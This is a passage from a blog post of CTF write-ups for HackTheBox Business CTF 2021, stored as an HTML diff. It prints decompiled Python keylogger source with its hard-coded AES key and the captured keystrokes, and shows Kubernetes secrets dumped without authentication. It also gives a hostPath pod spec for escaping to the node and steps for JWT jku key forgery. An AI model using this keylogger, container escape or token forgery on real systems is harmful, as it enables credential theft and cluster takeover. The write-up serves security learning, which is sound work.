Jul 14:56 Crypto .rw-r--r-- 3.4M leonjza 25 Jul 14:56 libcrypto-1_1.dll .rw-r--r-- 689k leonjza 25 Jul 14:56 libssl-1_1.dll .rw-r--r-- 2.2k leonjza 25 Jul 15:09 logger.pyc .rw-r--r-- 203k leonjza 25 Jul 14:56 pyexpat.pyd .rw-r--r-- 0 leonjza 25 Jul 14:56 pyi-windows-manifest-filename svchost.exe.manifest .rw-r--r-- 4.1k leonjza 25 Jul 14:56 pyiboot01_bootstrap.pyc .rw-r--r-- 1.8k leonjza 25 Jul 14:56 pyimod01_os_path.pyc .rw-r--r-- 8.8k leonjza 25 Jul 14:56 pyimod02_archive.pyc .rw-r--r-- 13k leonjza 25 Jul 14:56 pyimod03_importers.pyc .rw-r--r-- 3.8M leonjza 25 Jul 14:56 python37.dll .rw-r--r-- 1.4M leonjza 25 Jul 14:56 PYZ-00.pyz drwxr-xr-x - leonjza 25 Jul 14:56 PYZ-00.pyz_extracted .rw-r--r-- 27k leonjza 25 Jul 14:56 select.pyd .rw-r--r-- 297 leonjza 25 Jul 14:56 struct.pyc .rw-r--r-- 1.5k leonjza 25 Jul 14:56 svchost.exe.manifest .rw-r--r-- 1.1M leonjza 25 Jul 14:56 unicodedata.pyd .rw-r--r-- 88k leonjza 25 Jul 14:56 VCRUNTIME140.dll To recover the source code from a .pyc file, one could use a tool called uncompyle6. Much like how pyinstxtractor took the original exe and did the extraction, uncompyl6 takes a pyc and tries and rebuild the original source file from the byte code. Unfortunately, I could decode all of the .pyc files, except for logger.pyc. A quick look at the headers of both files, and I thankfully spotted that just the first byte of logger.pyc differed from a file like struct.pyc which we could decompile.\n❯ xxd logger.pyc | head 00000000: 610d 0d0a 0000 0000 0000 0000 0000 0000 a............... 00000010: e300 0000 0000 0000 0000 0000 0004 0000 ................ ❯ xxd struct.pyc 00000000: 420d 0d0a 0000 0000 7079 6930 1001 0000 B.......pyi0.... 00000010: e300 0000 0000 0000 0000 0000 0008 0000 ................ Using a hex editor I swapped the 0x61 for a 0x42, and viola, uncompyle6 was happy! The extracted source code was:\n# uncompyle6 version 3.7.5.dev0 # Python bytecode 3.7 (3394) # Decompiled from: Python 3.8.11 (default, Jul 22 2021, 15:32:17) # [GCC 8.3.0] # Embedded file name: logger.py from pynput.keyboard import Listener from Crypto.Cipher import AES import base64, os class Strokes(object): message: dict text: str counter: int def __init__(self) - None: self.message = {} self.text = '' self.counter = 1 def addToText(self, new_text: str) - None: self.text += new_text def addTextToDict(self) - None: self.message[self.counter] = self.text self.counter += 1 def clearText(self) - None: self.text = '' @staticmethod def encrypt(text: bytes) - bytes: key = 'w0MrV1vBmZi1Z17v' iv = 'Kh54H8JTmOYq5mre' cipher = AES.new(key.encode('utf-8'), AES.MODE_CFB, iv.encode('utf-8')) return base64.b64encode(cipher.encrypt(text)) def keystrokes(key: str, obj: object) - None: key = str(key).replace(\"'\", '') obj.addToText(key) if key == 'Key.enter': obj.addTextToDict() open(os.getenv('APPDATA') + '/anVzdGFuW1l.txt', 'a').write(str(Strokes.encrypt(f\"{str(obj.counter)}:{obj.text}\".encode('utf-8'))) + '\\n') obj.clearText() def main() - None: obj = Strokes() with Listener(on_press=(lambda event: keystrokes(event, obj))) as (log): log.join() if __name__ == '__main__': main() Here we could see eveything we needed to both understand the behaviour we saw in API monitor, but also to decrypt the contents of those strings in anVzdGFuW1l.txt. I reused the code from logger.py to write a quick decryptor for the strings we had.\nfrom Crypto.Cipher import AES import base64, os def decrypt(text: bytes) - bytes: key = 'w0MrV1vBmZi1Z17v' iv = 'Kh54H8JTmOYq5mre' cipher = AES.new(key.encode('utf-8'), AES.MODE_CFB, iv.encode('utf-8')) return cipher.decrypt(base64.b64decode(text)) def main() - None: with open('anVzdGFuW1l.txt', 'r') as f: source = f.readlines() for l in source: e = l.split(\"'\")[1] print(decrypt(e)) if __name__ == '__main__': main() The results were… the keyloggers input!\nb'2:google.comKey.enter' b'3:gmailKey.enter' b'4:aedwardsKey.shift@icorp.comKey.enter' b'5:Key.shiftKey.shiftKey.shiftKey.shiftKey.shiftKey.shiftFORGOTTENKey.spaceKey.shiftHARDKey.spaceKey.shiftDRIVEKey.enter' b'6:Key.shiftHelloKey.spaceeddie,Key.enter' b'7:Key.shiftSinceKey.spaceKey.shiftIKey.spacewontKey.spacecomeKey.spacetoKey.spaceworkKey.spacetodayKey.spaceandKey.spaceKey.shiftIKey.spacereallyKey.spaceneedKey.spacesomeKey.spacefilesKey.spaceleftKey.spaceimKey.spaceKey.backspaceKey.backspacenKey.spacemyKey.spacehardKey.spacedriveKey.spaceatKey.spacemyKey.spaceoffice,Key.spacecanKey.spaceyouKey.spacereachKey.spaceitKey.spaceandKey.spacesendKey.spacemeKey.spacetheKey.spacefileKey.spacenamedKey.spacestaffKey.shift_data.xlsxKey.shift?Key.enter' b'8:Key.shiftTheKey.spaceKey.shiftPINKey.spaceforKey.spaceyKey.backspacemyKey.spaceofficeKey.spaceisKey.shift:Key.space50133700013Key.shift}Key.enter' b'9:Key.shiftThanksKey.spaceinKey.spaceadvanceKey.shift!Key.enter' b'10:Key.shiftCarole.Key.enter' b'2:virtKey.backspaceKey.backspaceKey.backspaceKey.backspaceKey.backspaceboxKey.ctrl_lKey.ctrl_lsysinternalsKey.spacesuideKey.enter' b'2:dpiKey.enter' To make the output a little more readable, I replaced strings such as Key.shift and Key.enter with other values so we could see what was written. That meant that the call to print(decrypt(e)) was replaced with:\nprint(decrypt(e).decode().replace('Key.enter', '🧵').replace('Key.space', ' ') .replace('Key.backspace', ').replace('Key.shift', '^')) The output was therefore:\n❯ python3 decryptor.py 2:google.com🧵 3:gmail🧵 4:aedwards^@icorp.com🧵 5:^^^^^^FORGOTTEN ^HARD ^DRIVE🧵 6:^Hello eddie,🧵 7:^Since ^I wont come to work today and ^I really need some files left im Much more readable, and we can see the PIN is 50133700013^}, which is the second part of the flag!\nFlag: HTB{1_c4n_S33_3v3ryTh1ng_3v3n_y0uR_P1N_50133700013}\nCrazy cool :D\ncloud/Kube  Name: Kube Category: cloud Solves: 23 Rating 1/4 Type: Hosted Description: Due to increase in our web application traffic, we are switcing to kubernetes. We would like you to test our security.   Fun challenge, although maybe a little easy ;) After enumerating the IP address you get for the challenge, a Kubernetes API server is found on port 8443. Further exploration would have revealed that you were allowed to access secrets without authentication.\n❯ curl -s -k https://10.129.173.212:8443/api/v1/namespaces/kube-system/secrets { \"kind\": \"SecretList\", \"apiVersion\": \"v1\", \"metadata\": { \"resourceVersion\": \"94924\" }, \"items\": [ { \"metadata\": { \"name\": \"attachdetach-controller-token-5ts7m\", \"namespace\": \"kube-system\", \"uid\": \"ff42960f-f063-4df3-b330-e4cbc26f56d4\", \"resourceVersion\": \"356\", \"creationTimestamp\": \"2021-07-19T19:06:55Z\", \"annotations\": { \"kubernetes.io/service-account.name\": \"attachdetach-controller\", \"kubernetes.io/service-account.uid\": \"b780d31d-3e92-40af-8a12-dbec2d4e5675\" }, \"managedFields\": [ { \"manager\": \"kube-controller-manager\", \"operation\": \"Update\", \"apiVersion\": \"v1\", \"time\": \"2021-07-19T19:06:55Z\", \"fieldsType\": \"FieldsV1\", \"fieldsV1\": {\"f:data\":{\".\":{},\"f:ca.crt\":{},\"f:namespace\":{},\"f:token\":{}},\"f:metadata\":{\"f:annotations\":{\".\":{},\"f:kubernetes.io/service-account.name\":{},\"f:kubernetes.io/service-account.uid\":{}}},\"f:type\":{}} } ] }, \"data\": { \"ca.crt\": \"LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSURCakNDQWU2Z0F3SUJBZ0lCQVRBTkJna3Foa2lHOXcwQkFRc0ZBREFWTVJNd0VRWURWUVFERXdwdGFXNXAKYTNWaVpVTkJNQjRYRFRJeE1EY3hPREU1TURVME1Wb1hEVE14TURjeE56RTVNRFUwTVZvd0ZURVRNQkVHQTFVRQpBeE1LYldsdWFXdDFZbVZEUVRDQ0FTSXdEUVlKS29aSWh2Y05BUUVCQlFBRGdnRVBBRENDQVFvQ2dnRUJBTWJRCmM1YmlkbEl0ekdDemNDRUltaHRJTVBucVdiZkRUbGgxdHFFVUozakM5RHJJNE5WRWt0cnB0MnFsbEFCNlJLQlMKNTNUTDFMcHVtMEl3ZTdzZkdJTCtZaG1Zb2ZUZ2VWSHJVMWJzaHBESXlkU3kwTTBKMFhvMG5zQ2lrajgvWHBjbApjbVNzSUhQMjUwNFRXekRaYXF1dU96cUxJWklkNzQrY3FQQ0VXMnlhazFUVWdmVXoyTVdTbVM4eDJMSG05SkJVCmVEcnFkTUx2K2NhVTRET2FLUFVtaVhYNUFSOUp1UGUvTGRYcno5RUw0Sm1mZUFBakhZSVBTcXRIbXpQMmxxdVYKbjk3M254RkpxZEtlWWovNGpvQldNd2t4MXpCZkpZUG5uWkRoUk94NFhOMUxrdFVDeDBoWmlhNEs4OHRCeS9CYQp6eml3NFloRmtycWo0dnNlSDdzQ0F3RUFBYU5oTUY4d0RnWURWUjBQQVFIL0JBUURBZ0trTUIwR0ExVWRKUVFXCk1CUUdDQ3NHQVFVRkJ3TUNCZ2dyQmdFRkJRY0RBVEFQQmdOVkhSTUJBZjhFQlRBREFRSC9NQjBHQTFVZERnUVcKQkJRTXlHNGVkOC93WWdjRFBGeW5HdVE1SVNzL3pqQU5CZ2txaGtpRzl3MEJBUXNGQUFPQ0FRRUFZY2dvbjUrNAp3cklTN0hlVm1pSWQvamRCOU1zdXNsTVl5dU11R2hWVXBIc1QvWEg0aUxTVjhiQWNSNDd2bjFmcjZqVFN3UGJYCnd5c1AzSTRwcHNZWkNWdDEzRWJSNlBsZktIUzlONlJYLzI4eXFVcmJwTUM2Z3NqVVNOd1FEdTQralVvb3BicGcKZW55eTZIZkRlTnZyTDMxOGoyOFZBT2syREw4NzFwNTV3SnhGUlhzeTZFeVFLczR0eXovSVVGTlVVZktTWVhmMgpZQmFaTHY4TzFaWGdBVEpqSFJRMEZySEhxcHZHdEcxdGRqVXhSSmQzSlFxMHlHd1AyYVZiMGhMNkQ0eUdCUzhMCk83MWdDRWlxcjY4OEZOSFhObGdyekwxc0JqNVlKcGNzLzV4NkdjYmp1WXVUMFcwZ0pIbHIwZGR1aUpDTmZVamsKWm9RRXU3OTFPK3RBOWc9PQotLS0tLUVORCBDRVJUSUZJQ0FURS0tLS0tCg==\", \"namespace\": \"a3ViZS1zeXN0ZW0=\", \"token\": \"ZXlKaGJHY2lPaUpTVXpJMU5pSXNJbXRwWkNJNklrMVlTbFZxVDBwM2QyTnRNVzk1V2xCM09Ua3hRMEpmYW1oTmVHMHhUMlZTZUVOSVRITmZZV3gwYldzaWZRLmV5SnBjM01pT2lKcmRXSmxjbTVsZEdWekwzTmxjblpwWTJWaFkyTnZkVzUwSWl3aWEzVmlaWEp1WlhSbGN5NXBieTl6WlhKMmFXTmxZV05qYjNWdWRDOXVZVzFsYzNCaFkyVWlPaUpyZFdKbExYTjVjM1JsYlNJc0ltdDFZbVZ5Ym1WMFpYTXVhVzh2YzJWeWRtbGpaV0ZqWTI5MWJuUXZjMlZqY21WMExtNWhiV1VpT2lKaGRIUmhZMmhrWlhSaFkyZ3RZMjl1ZEhKdmJHeGxjaTEwYjJ0bGJpMDFkSE0zYlNJc0ltdDFZbVZ5Ym1WMFpYTXVhVzh2YzJWeWRtbGpaV0ZqWTI5MWJuUXZjMlZ5ZG1salpTMWhZMk52ZFc1MExtNWhiV1VpT2lKaGRIUmhZMmhrWlhSaFkyZ3RZMjl1ZEhKdmJHeGxjaUlzSW10MVltVnlibVYwWlhNdWFXOHZjMlZ5ZG1salpXRmpZMjkxYm5RdmMyVnlkbWxqWlMxaFkyTnZkVzUwTG5WcFpDSTZJbUkzT0RCa016RmtMVE5sT1RJdE5EQmhaaTA0WVRFeUxXUmlaV015WkRSbE5UWTNOU0lzSW5OMVlpSTZJbk41YzNSbGJUcHpaWEoyYVdObFlXTmpiM1Z1ZERwcmRXSmxMWE41YzNSbGJUcGhkSFJoWTJoa1pYUmhZMmd0WTI5dWRISnZiR3hsY2lKOS5ZR0VyLWtWQmZweUJ1UWVnUFdYU2hMUnFQOHA0WUxkSnFKdXVKYVU4V01BalVDQnhjNnRqMVNKdmlpM09jOXd1SjlzZ04wVUQ4c2phS0dqSkVGUF9zRDdRcV8wSXEtM0pxcG1vTkNpNW1qcGdEeGlNTVBKWHJUbzBqV0oyVl9WSmt0V18za29YLXh0bmZ3WS1ONVQtalpJTENqR1JYMF90V1pnS09IYmxBclppT1FfVjN0TnJwU0pFQmxvZmlVNzhHQWZtMDlETmExX1pkUHhKVFdBSjNoaElETzFUVmJTZG9WcGRZSXVlWFBEb0FXZXlrMEVHcnpsNVJyT0FzLU9Fd05tMU5yU1dhaFpNdnFsUmVQbmswdmxHc01LZTM5amZ5Q0dGVmd0ZkI1ZG1mYTh6bXRqcDYyOGNwaHZXOXFOSmhEeGZ0bFhJVFFiQmtfMlVydGxQZXc=\" }, \"type\": \"kubernetes.io/service-account-token\" }, ... It is possible to configure the kubectl Kubernetes client to use a token (I grabbed one for the default service account), with the following ~/.kube/config file format:\napiVersion: v1 clusters: - cluster: insecure-skip-tls-verify: true server: https://10.129.173.212:8443 name: scratch contexts: - context: cluster: scratch user: userino name: contexterino current-context: \"\" kind: Config preferences: {} users: - name: userino user: token: eyJhbGciOiJSUzI1NiIsImtpZCI6Ik1YSlVqT0p3d2NtMW95WlB3OTkxQ0JfamhNeG0xT2VSeENITHNfYWx0bWsifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJkZWZhdWx0LXRva2VuLTdmaDg5Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6ImRlZmF1bHQiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiJjNzM4YjRjMy1lNjE1LTRhYTktODZmYS1mOWYyZWU0M2ZmMzgiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6a3ViZS1zeXN0ZW06ZGVmYXVsdCJ9.gJFAXzNWCh7e4cgKgaYHf96zH33Q06XnigyB5zZiYsjlKQBBebB4mykMhLB-_UbB7YRnMqOFVPd0pj82q72E3LvizUxVNK90vtZGqLVS4oeCKjWOj30FpwGHR0aDW8id55U3yCv0x1gTJVK25dUQkqqelaG6qGtV35NCAz5oXNfQLWXbhCih0zYHHoM6vvHzK8PpR_YEMXoJV81uKfYBHioRZXDpYHe_3783A202PVCElIwWlT2YzSCTdj9zvx14Xm-sJJyLB8jMkZx19TM_cFRGZ4ig6Pso585Xjf3zmtGI2kz8jSLHKz8qXfZQixXdbzWnJPsz2EdC7XhMIfcfNQ That means that we could now interact with the remote Kubernetes cluster using the kubectl command to do things. Because this was highly privileged token, we could also launch pods and make changes as necessary.\nEnumerating the cluster you’d find default Kubernetes namespaces and an alpine pod that cant start up.\n❯ kubectl --context=contexterino --namespace=kube-system get pods NAME READY STATUS RESTARTS AGE alpine 0/1 ImagePullBackOff 0 5d1h coredns-558bd4d5db-qrg6l 1/1 Running 5 7d2h etcd-kube 1/1 Running 0 10m kube-apiserver-kube 1/1 Running 0 10m kube-controller-manager-kube 1/1 Running 5 7d2h kube-proxy-ndk7j 1/1 Running 5 7d2h kube-scheduler-kube 1/1 Running 5 7d2h storage-provisioner 1/1 Running 11 7d2h Running describe pod alpine we’d see that the pod can’t pull the image needed for it.\nWarning Failed 8m15s (x4 over 10m) kubelet Failed to pull image \"alpine\": rpc error: code = Unknown desc = Error response from daemon: Get https://registry-1.docker.io/v2/: net/http: request canceled while waiting for connection (Client.Timeout exceeded while awaiting headers) Warning Failed 8m15s (x4 over 10m) kubelet Error: ErrImagePull Warning Failed 7m49s (x6 over 10m) kubelet Error: ImagePullBackOff Normal BackOff 23s (x35 over 10m) kubelet Back-off pulling image \"alpine\" I spent some time investigating pods by trying to get shells inside of them. The general workflow was to list the pods in each namespace, and then exec inside of each. However, I couldn’t run sh or bash in many of them as they were simply not installed. A good hardening tip! Ofc, I could have run other commands, but meh.\n❯ kubectl --context=contexterino --namespace=kube-system exec -it kube-apiserver-kube -- sh OCI runtime exec failed: exec failed: container_linux.go:344: starting container process caused \"exec: \\\"sh\\\": executable file not found in $PATH\": unknown command terminated with exit code 126 The pods that did give me a shell were:\n kube-system/etcd-kube kube-system/kube-proxy-ndk7j  Neither had anything interesting in them though. Time for a new strategy!\nOne attack plan we could exercise was to escape to the Kubernetes node a pod is running on by mounting the nodes’ file system into a container. This can be done with a hostPath mount option for a deployment. I did not want to fiddle with pods running in the kube-system namespace in fear of breaking them, so I opted to create a new deployment with the hostPath configuration. Because we can’t pull the alpine image, I chose to re-use one of the already running pods images.\n❯ kubectl --context=contexterino --namespace=kube-system describe pod kube-proxy-ndk7j | grep Image Image: k8s.gcr.io/kube-proxy:v1.21.2 Image ID: docker-pullable://k8s.gcr.io/kube-proxy@sha256:3ee783402715225d6bc483b3a2f8ea11adcb997d00fb5ca2f74734023ade0561 Great. The last step was to create a new deployment and apply it.\napiVersion: v1 kind: Pod metadata: name: alpine-pew namespace: default spec: volumes: - name: host-fs hostPath: path: / containers: - image: k8s.gcr.io/kube-proxy:v1.21.2 command: - /bin/sh - \"-c\" - \"sleep 60m\" volumeMounts: - name: host-fs mountPath: /mnt imagePullPolicy: IfNotPresent name: alpine restartPolicy: Always Applying the deployment was as simple as:\n❯ kubectl --context=contexterino apply -f pew.yml pod/alpine-pew created Finally, get a shell and browse the nodes filesystem!\n❯ kubectl --context=contexterino --namespace=default exec -it alpine-pew -- sh # cd /mnt # ls bin dev home initrd.img.old lib32 libx32 media opt root sbin sys usr vmlinuz boot etc initrd.img lib lib64 lost+found mnt proc run srv tmp var vmlinuz.old # cd root # ls flag.txt # cat flag.txt HTB{5y573m:4N0nYM0u5} Flag: HTB{5y573m:4N0nYM0u5}\nconclusion We solved a lot, and this is by no means all of them, but, it’s the ones I enjoyed!\n","wordCount":"3814","inLanguage":"en","image":"https://leonjza.github.io/images/htbbusiness21/htb_business_logo.png","datePublished":"2021-07-26T20:19:36+02:00","dateModified":"2021-07-26T20:19:36+02:00","author":{"@type":"Person","name":"Leon Jacobs"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://leonjza.github.io/blog/2021/07/26/hackthebox-business-ctf-2021-writeups/"},"publisher":{"@type":"Organization","name":"#!/bin/note\n","logo":{"@type":"ImageObject","url":"https://leonjza.github.io/favicon.ico"}}}</script>
 </head>
-<body class=dark-theme>
-<div class=container>
+<body id=top>
+<script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add('dark'):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove('dark'):window.matchMedia('(prefers-color-scheme: dark)').matches&&document.body.classList.add('dark')</script>
 <header class=header>
-<span class=header__inner>
-<a href=/ class=logo style=text-decoration:none>
-<span class=logo__mark><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44"><path fill="none" d="M15 8l14.729 14.382L15 35.367"/></svg>
-</span>
-<span class=logo__text>#!/bin/note
-</span>
-<span class=logo__cursor></span>
+<nav class=nav>
+<div class=logo>
+<a href=https://leonjza.github.io accesskey=h title="#!/bin/note
+ (Alt + H)">#!/bin/note
 </a>
-<span class=header__right>
-<nav class=menu>
-<ul class="menu__inner menu__inner--desktop">
-<li><a href=/about/>About Me</a></li>
-<li><a href=/categories>Categories</a></li>
-<li><a href=/posts>Posts</a></li>
-</ul>
-<ul class="menu__inner menu__inner--mobile">
-<li><a href=/about/>About Me</a></li>
-<li><a href=/categories>Categories</a></li>
-<li><a href=/posts>Posts</a></li>
+<span class=logo-switches>
+<button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg>
+</button>
+</span>
+</div>
+<ul id=menu>
+<li>
+<a href=https://leonjza.github.io/about/ title="About Me">
+<span>About Me</span>
+</a>
+</li>
+<li>
+<a href=https://leonjza.github.io/archives title=Archive>
+<span>Archive</span>
+</a>
+</li>
+<li>
+<a href=https://leonjza.github.io/categories title=Categories>
+<span>Categories</span>
+</a>
+</li>
+<li>
+<a href=https://leonjza.github.io/search/ title="Search (Alt + /)" accesskey=/>
+<span>Search</span>
+</a>
+</li>
 </ul>
 </nav>
-<span class=menu-trigger><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M0 0h24v24H0z" fill="none"/><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg>
-</span>
-<span class=theme-toggle><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M22 41c10.4934.0 19-8.5066 19-19C41 11.5066 32.4934 3 22 3 11.5066 3 3 11.5066 3 22s8.5066 19 19 19zM7 22C7 13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22z"/></svg>
-</span>
-</span>
-</span>
 </header>
-<div class=content>
-<div class=post>
-<h1 class=post-title>hackthebox business ctf 2021 writeups</h1>
-<div class=post-meta>
-<span class=post-date>
-2021-07-26
-</span>
-<span class=post-read-time>— 18 min read</span>
+<main class=main>
+<article class=post-single>
+<header class=post-header>
+<div class=breadcrumbs><a href=https://leonjza.github.io>Home</a>&nbsp;»&nbsp;<a href=https://leonjza.github.io/posts/>Posts</a></div>
+<h1 class=post-title>
+hackthebox business ctf 2021 writeups
+</h1>
+<div class=post-meta>July 26, 2021&nbsp;·&nbsp;18 min&nbsp;·&nbsp;Leon Jacobs&nbsp;|&nbsp;<a href=https://github.com/leonjza/leonjza.github.io/tree/source/content/posts/2021-07-26-hackthebox-business-ctf-2021.markdown rel="noopener noreferrer" target=_blank>Suggest Changes</a>
 </div>
-<figure class=post-cover>
-<img src=https://leonjza.github.io/images/htbbusiness21/htb_business_logo.png alt="hackthebox business ctf 2021 writeups">
-</figure>
-<div class=post-content>
-<h2>Table of Contents</h2>
-<aside class=table-of-contents><nav id=TableOfContents>
-<ul>
-<li><a href=#solutions>solutions</a>
-<ul>
-<li><a href=#webemergency>web/Emergency</a></li>
-<li><a href=#weblarablog>web/Larablog</a></li>
-<li><a href=#forensicsdfir>forensics/DFIR</a></li>
-<li><a href=#cloudkube>cloud/Kube</a></li>
-</ul>
+</header>
+<figure class=entry-cover><img loading=lazy src=https://leonjza.github.io/images/htbbusiness21/htb_business_logo.png alt>
+</figure><div class=toc>
+<details>
+<summary accesskey=c title="(Alt + C)">
+<span class=details>Table of Contents</span>
+</summary>
+<div class=inner><ul>
+<li>
+<a href=#solutions aria-label=solutions>solutions</a><ul>
+<li>
+<a href=#webemergency aria-label=web/Emergency>web/Emergency</a></li>
+<li>
+<a href=#weblarablog aria-label=web/Larablog>web/Larablog</a></li>
+<li>
+<a href=#forensicsdfir aria-label=forensics/DFIR>forensics/DFIR</a></li>
+<li>
+<a href=#cloudkube aria-label=cloud/Kube>cloud/Kube</a></li></ul>
 </li>
-<li><a href=#conclusion>conclusion</a></li>
+<li>
+<a href=#conclusion aria-label=conclusion>conclusion</a>
+</li>
 </ul>
-</nav></aside>
-<p>The <a href=https://www.hackthebox.eu/htb-business-ctf-2021>HackTheBox Business CTF 2021</a> ran this weekend, and I played with a few colleagues at Orange Cyberdefense / SensePost. We managed to score <a href=https://ctf.hackthebox.eu/ctf/131/scoreboard><em>5th</em></a> place amongst 374 other teams!</p>
-<figure class=left>
-<img src=/images/htbbusiness21/htb_placement.png>
+</div>
+</details>
+</div>
+<div class=post-content><p>The <a href=https://www.hackthebox.eu/htb-business-ctf-2021>HackTheBox Business CTF 2021</a> ran this weekend, and I played with a few colleagues at Orange Cyberdefense / SensePost. We managed to score <a href=https://ctf.hackthebox.eu/ctf/131/scoreboard><em>5th</em></a> place amongst 374 other teams!</p>
+<figure>
+<img loading=lazy src=/images/htbbusiness21/htb_placement.png>
 </figure>
-<figure class=left>
-<img src=/images/htbbusiness21/htb_graph.png>
+<figure>
+<img loading=lazy src=/images/htbbusiness21/htb_graph.png>
 </figure>
 <p>The team consisted of (those with twitterz!): <a href=https://twitter.com/felmoltor>felmoltor</a>, <a href=https://twitter.com/JCoertze>JCoertze</a>, <a href=https://twitter.com/TH3_GOAT_FARM3R>TH3_GOAT_FARM3R</a>, <a href=https://twitter.com/Titanex8>Titanex8</a>, <a href=https://twitter.com/_cablethief>_cablethief</a>, <a href=https://twitter.com/gav1no_>gav1no_</a> and <a href=https://twitter.com/GMILTE>GMILTE</a>.</p>
-<h1 id=solutions>solutions</h1>
+<h1 id=solutions>solutions<a hidden class=anchor aria-hidden=true href=#solutions>#</a></h1>
 <p>We solved 38 out of the 44 challenges, and in this post I will write up some of the ones I solved and found interesting (and have energy for). Unfortunately there&rsquo;s just too many to write up. Anyways, here goes!</p>
-<h2 id=webemergency>web/Emergency</h2>
+<h2 id=webemergency>web/Emergency<a hidden class=anchor aria-hidden=true href=#webemergency>#</a></h2>
 <ul>
 <li>Name: Emergency</li>
 <li>Category: Web</li>
@@ -143,12 +158,12 @@ The team consisted of (those with twitterz!): felmoltor, JCoertze, TH3_GOAT_FARM
 </ul>
 <hr>
 <p>Register & login with an account you create.</p>
-<figure class=left>
-<img src=/images/htbbusiness21/htb_emergency_1.png>
+<figure>
+<img loading=lazy src=/images/htbbusiness21/htb_emergency_1.png>
 </figure>
 <p>The hint at the top right tells us that if we can login as an admin, we&rsquo;ll see the flag there. Alright. Once logged in, you get a cookie called <code>auth</code> that looks like a JWT. Decoding that JWT in <a href=https://jwt.io/>https://jwt.io/</a> should reveal the contents.</p>
-<figure class=left>
-<img src=/images/htbbusiness21/htb_emergency_2.png>
+<figure>
+<img loading=lazy src=/images/htbbusiness21/htb_emergency_2.png>
 </figure>
 <p>The header contains an interesting field called <code>jku</code> (JWK Set URL) <a href=https://datatracker.ietf.org/doc/html/rfc7515#section-4.1.2>rfc7515</a>. While it shows localhost as the host where it&rsquo;s hosted, browsing to <code>/.well-known/jwks.json</code> on the target returns:</p>
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json>{
@@ -169,8 +184,8 @@ The team consisted of (those with twitterz!): felmoltor, JCoertze, TH3_GOAT_FARM
 openssl rsa -in keypair.pem -pubout -out publickey.crt
 openssl pkcs8 -topk8 -inform PEM -outform PEM -nocrypt -in keypair.pem -out pkcs8.key
 </code></pre></div><p>Next, copy the generated <code>publickey.crt</code> and <code>pkcs8.key</code> into <a href=https://jwt.io/>https://jwt.io/</a>. This will let you modify the header & payload data fields of the JWT.</p>
-<figure class=left>
-<img src=/images/htbbusiness21/htb_emergency_3.png>
+<figure>
+<img loading=lazy src=/images/htbbusiness21/htb_emergency_3.png>
 </figure>
 <p>Next, we will be hosting our own forged <code>jwks.json</code> file somewhere, but with modified values based on the keypair we generated. So, download the existing <code>/.well-known/jwks.json</code> file, and replace the <code>n</code> and <code>e</code> values with those that are printed using the following script:</p>
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#f92672>from</span> Crypto.PublicKey <span style=color:#f92672>import</span> RSA
@@ -199,7 +214,7 @@ e: <span style=color:#ae81ff>65537</span>
 ]}
 </code></pre></div><p>Host this file somewhere on the Internet where the challenge box can find it, update the <code>jku</code> URL in <a href=https://jwt.io/>https://jwt.io/</a> to where you are hosting the JWKS and update the existing cookie value to the new, forged one generated by <a href=https://jwt.io/>https://jwt.io/</a>. Finally, reload the page and voila!</p>
 <p>Flag: <code>HTB{your_JWTS_4r3_cl41m3d!!}</code></p>
-<h2 id=weblarablog>web/Larablog</h2>
+<h2 id=weblarablog>web/Larablog<a hidden class=anchor aria-hidden=true href=#weblarablog>#</a></h2>
 <ul>
 <li>Name: Larablog</li>
 <li>Category: Web</li>
@@ -210,8 +225,8 @@ e: <span style=color:#ae81ff>65537</span>
 </ul>
 <hr>
 <p>The landing page is a &ldquo;blog&rdquo; with one entry where the author speaks about an nginx related configuration.</p>
-<figure class=left>
-<img src=/images/htbbusiness21/htb_larablog_1.png>
+<figure>
+<img loading=lazy src=/images/htbbusiness21/htb_larablog_1.png>
 </figure>
 <p>I assumed this was the configuration the server in the challenge had. The nginx configuration file on the page was:</p>
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>user www;
